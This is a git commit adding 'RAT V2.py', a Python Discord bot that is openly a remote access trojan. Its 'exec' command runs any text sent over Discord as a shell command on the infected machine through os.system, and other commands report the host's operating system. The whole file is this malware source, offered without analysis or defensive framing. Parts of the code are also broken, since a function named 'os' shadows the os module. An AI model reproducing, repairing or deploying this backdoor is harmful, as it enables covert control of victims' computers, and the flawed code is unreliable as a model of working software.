250dc152cccc40327c17d55b2d31d66f229ebab7
sniperking3335 <80844436+sniperking3335@users.noreply.github.com>
2021-03-17 18:28:44 +0200

    Add files via upload

---
+++ RAT V2.py
@@ -0,0 +1,41 @@
+import os
+import sys
+import discord
+from sys import platform
+from discord.ext import commands
+
+client = commands.Bot(command_prefix="*")
+
+token = input('bot token:')
+
+@client.event
+async def on_ready():
+    print('bot online')
+
+@client.command()
+async def exec(ctx, *, text):
+    message = ctx.message
+    os.system(f"{text}")
+    await ctx.send(f'executing the command `{text}`...')
+
+@client.command()
+async def os(ctx):
+    oschk= sys.platform
+    try:
+        await ctx.send(f'{oschk}')
+    except:
+        pass
+
+@client.command()
+async def oscmds(ctx):
+    await ctx.send('win32 - windows(batch)\nlinux or linux2 - linux(bash)')
+
+@client.command()
+async def stopclient(ctx):
+    await ctx.send('stopping the bot...')
+    try:
+        os.system('exit')
+    except:
+        pass
+
+client.run(''+token)
